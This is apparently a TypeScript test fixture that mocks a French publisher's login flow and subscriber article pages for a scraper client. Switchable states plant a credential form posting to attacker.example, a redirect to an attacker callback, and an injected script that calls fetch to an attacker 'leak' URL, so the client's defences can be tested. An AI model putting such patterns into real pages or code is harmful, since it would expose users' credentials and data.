import type { JournalLoginConfig } from "@dailybrief/shared";
import type { FetchPage, RemotePageOptions } from "../../src/network";

export const loginConfig: JournalLoginConfig = {
  loginUrl: "https://publisher.example/login",
  emailSelector: "#email",
  passwordSelector: "#password",
  submitSelector: "#submit",
  successSelector: "#account",
  articleContentSelector: ".full-body",
};
export const fullText =
  "Le contenu complet réservé aux abonnés détaille les faits et leurs conséquences. ".repeat(12);
export function journalFixture() {
  const requests: { url: string; options?: RemotePageOptions }[] = [];
  const state = {
    failed: false,
    expired: false,
    paywall: false,
    getForm: false,
    foreignPost: false,
    foreignRedirect: false,
    subscription: true,
    malicious: false,
  };
  const form = () =>
    `<form method="${state.getForm ? "get" : "post"}" action="${state.foreignPost ? "https://attacker.example" : ""}/authenticate"><input id="email" type="email" name="email"><input id="password" type="password" name="password"><button id="submit">Connexion</button></form>`;
  const fetch: FetchPage = async (url, options) => {
    requests.push({ url, options });
    const path = new URL(url).pathname;
    if (path === "/login")
      return { status: 200, cookies: [], text: form(), contentType: "text/html" };
    if (path === "/authenticate") {
      if (options?.method !== "POST") throw new Error("POST required");
      if (state.failed)
        return {
          status: 200,
          cookies: [],
          text: `${form()}<p>Connexion refusée ${options.body}</p>`,
          contentType: "text/html",
        };
      const email = new URLSearchParams(options.body).get("email") ?? "";
      return {
        status: 303,
        cookies: [
          `sid=${email.startsWith("other") ? "other-session" : "own-session"}; Path=/; HttpOnly; Secure`,
        ],
        location: state.foreignRedirect ? "https://attacker.example/callback" : "/account",
        text: "",
      };
    }
    if (path === "/account")
      return {
        status: 200,
        cookies: [],
        text: '<div id="account">Mon compte</div>',
        contentType: "text/html",
      };
    if (path === "/article") {
      if (state.expired)
        return {
          status: 200,
          cookies: [],
          text: `${form()}<p>${"Session expirée, merci de vous reconnecter. ".repeat(8)}</p>`,
          contentType: "text/html",
        };
      if (!options?.cookie?.includes("sid=")) throw new Error("Authenticated cookie required");
      return {
        status: 200,
        cookies: [],
        contentType: "text/html",
        text: `<script type="application/ld+json">{"@type":"NewsArticle","isAccessibleForFree":${!state.subscription}}</script><nav>Navigation publique</nav>${state.paywall ? '<div class="paywall">Abonnez-vous</div>' : ""}<article class="full-body"><h1>Article abonné</h1><p>${fullText}</p></article>${state.malicious ? '<script>fetch("https://attacker.example/leak");fetch("https://publisher.example/mutation",{method:"POST",body:"mutate"}).catch(()=>{});</script>' : ""}`,
      };
    }
    return { status: 200, cookies: [], text: "", contentType: "application/javascript" };
  };
  return { fetch, requests, state };
}
